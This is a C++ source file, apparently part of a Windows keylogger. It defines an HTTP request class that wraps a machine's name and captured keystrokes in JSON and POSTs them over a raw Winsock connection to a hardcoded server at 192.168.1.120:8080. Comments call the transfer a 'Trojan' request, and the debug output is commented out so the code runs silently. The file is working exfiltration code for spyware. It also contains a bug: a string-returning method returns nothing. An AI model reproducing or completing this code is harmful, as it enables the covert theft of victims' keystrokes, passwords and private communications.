#include "../headers/HttpRequest.h"
#include <iostream>
#include <WinSock2.h> // Gotta send it to the server somehow.
#include <WS2tcpip.h>

// Contructor / Destructor Definitions

// Default Constructor
HttpRequest::HttpRequest()
{
}

// Constructor that allows passing parameters for the comp name, host, method type, and keystrokes.
HttpRequest::HttpRequest(std::string name, std::string host, std::string type, std::string keys)
{
    computerName = name;
    url = host;
    method = type;
    keystrokes = keys;
}

// Destructor
HttpRequest::~HttpRequest()
{
}

// Accessor Methods

// getComputername
std::string HttpRequest::getComputerName()
{
    return computerName;
}

std::string HttpRequest::getKeystrokes()
{
    return keystrokes;
}

std::string HttpRequest::getMethod()
{
    return method;
}

std::string HttpRequest::getRequest()
{
    return request;
}

std::string HttpRequest::getUrl()
{
    return url;
}

//Setters

void HttpRequest::setRequest(std::string reqString)
{
    request = reqString;
}

void HttpRequest::setComputerName(std::string name)
{
    computerName = name;
}

void HttpRequest::setKeystrokes(std::string keys)
{
    keystrokes = keys;
}

void HttpRequest::setMethod(std::string type)
{
    method = type;
}

void HttpRequest::setUrl(std::string host)
{
    url = host;
}

// buildRequest Method Definition
std::string HttpRequest::buildRequest()
{
    //THANK GOD HTTP IS A PLAINTEXT PROTOCOL.
    std::string reqBody = "";

    reqBody.append("{\n");
    reqBody.append("\"computerName\":");
    reqBody.append("\"" + getComputerName() + "\",\n");
    reqBody.append("\"keystrokes\":");
    reqBody.append("\"" + getKeystrokes() + "\"\n");
    reqBody.append("}");

    std::string reqString = "";

    reqString.append("POST /sendkeys HTTP/1.1\r\n");
    reqString.append("Host: localhost:8080\r\n");
    reqString.append("Content-Type: application/json\r\n");
    reqString.append("cache-control: no-cache\n");
    reqString.append("content-length: " + std::to_string(reqBody.length()));
    reqString.append("\r\n");
    reqString.append("\r\n");
    reqString.append(reqBody);
    reqString.append("\r\n");

    setRequest(reqString);

    std::cout << reqString << std::endl;
}

//Method for sending the http request through the socket to the server.
void HttpRequest::sendRequest()
{
    WSADATA WSAData;

    if(WSAStartup(MAKEWORD(2,0), &WSAData) != 0)
    {
        //std::cout << "Failed to start winsock" << std::endl;
    }
    else
    {
        //std::cout << "Successfully started winsock" << std::endl;
        struct addrinfo hostConfig;
        ZeroMemory(&hostConfig, sizeof(hostConfig));
        hostConfig.ai_family = AF_INET;
        hostConfig.ai_protocol = IPPROTO_TCP;
        hostConfig.ai_socktype = SOCK_STREAM;

        struct addrinfo* serverConfig = NULL;

        DWORD getAddr = getaddrinfo("192.168.1.120", NULL, &hostConfig, &serverConfig);

        if(getAddr !=0 || serverConfig == NULL){
            //std::cout << "Failed to get hostname" << std::endl;
        } else {
            //std::cout << "Successfully Found server" << std::endl;
        }

        SOCKADDR_IN socketConfig;

        socketConfig.sin_addr = ((struct sockaddr_in*) serverConfig->ai_addr)->sin_addr;
        socketConfig.sin_family = AF_INET;
        socketConfig.sin_port = htons(8080);

        freeaddrinfo(serverConfig);

        //std::cout << "Socket Configured." << std::endl;

        SOCKET keyloggerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(keyloggerSocket == INVALID_SOCKET)
        {
            //std::cout << "Failed to create socket" << std::endl;
        }
        else
        {
            //std::cout << "Successfully created socket" << std::endl;
        }

        //std::cout << "connecting to server" << std::endl;

        if(connect(keyloggerSocket, (SOCKADDR*)&socketConfig, sizeof(socketConfig)) != 0)
        {
            //std::cout << "Failed to connect. " << WSAGetLastError() << std::endl;
        }
        else
        {
            //std::cout << "Server Connection successful." << std::endl;
        }

        //std::cout << "Sending Trojan HTTP POST Request to the server." << std::endl;
        int sentBytes = send(keyloggerSocket, getRequest().c_str(), strlen(getRequest().c_str()), 0);
        if(sentBytes < strlen(getRequest().c_str()) || sentBytes == SOCKET_ERROR){
            //std::cout << "Failed to Send post request." << WSAGetLastError() << std::endl;
        }
        else {
            //std::cout << "Successfully Sent post request to server" << std::endl;
        }
        closesocket(keyloggerSocket);
    }
}